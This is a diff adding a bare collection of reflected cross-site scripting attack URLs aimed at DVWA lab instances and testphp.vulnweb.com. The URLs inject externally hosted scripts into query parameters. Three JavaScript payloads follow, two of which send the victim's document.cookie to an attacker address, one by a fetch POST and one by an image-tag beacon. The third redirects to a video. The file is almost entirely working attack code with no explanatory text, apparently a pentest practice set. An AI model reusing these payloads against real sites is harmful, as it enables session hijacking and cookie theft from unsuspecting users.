@@ -1,0 +1,41 @@
+http://192.168.113.1/dvwa/vulnerabilities/xss_r/?name=<script src="https://app.staticsave.com/xsspayload/alertonclick.js"></script>
+
+http://172.19.17.212/dvwa/vulnerabilities/xss_r/?name=<script src="https://app.staticsave.com/xsspayload/alertonclick.js"></script>
+
+https://app.staticsave.com/xsspayload/acunetix.js
+
+http://testphp.vulnweb.com/<script src="https://app.staticsave.com/xsspayload/acunetix.js"></script>
+
+http://testphp.vulnweb.com/search.php?test=<script src="https://app.staticsave.com/xsspayload/acunetix.js"></script>
+
+http://testphp.vulnweb.com/search.php?test=query<script src="https://app.staticsave.com/xsspayload/acunetix.js"></script>
+
+http://172.19.17.212/dvwa/vulnerabilities/xss_r/?name=<script src="https://app.staticsave.com/xsspayload/redirectyoutube.js"></script>
+
+http://172.19.17.212/dvwa/vulnerabilities/xss_r/?name=<script src="https://app.staticsave.com/xsspayload/imagecookie.js"></script>
+
+
+
+document.getElementById('submit-button').addEventListener('click', function() {
+alert('HaCkEd');
+fetch("http://192.168.113.128", {
+  method: "post",
+  headers: {
+    'Accept': 'application/json',
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    'cookie': document.cookie
+  })
+})
+});  
+
+document.getElementById('submit-button').addEventListener('click', function() {
+alert('HaCkEd');
+document.write('<img src=http://192.168.113.128:1234?c='+escape(document.cookie)+'  >');
+});  
+
+document.getElementById('submit-button').addEventListener('click', function() {
+alert('HaCkEd');
+window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+});  
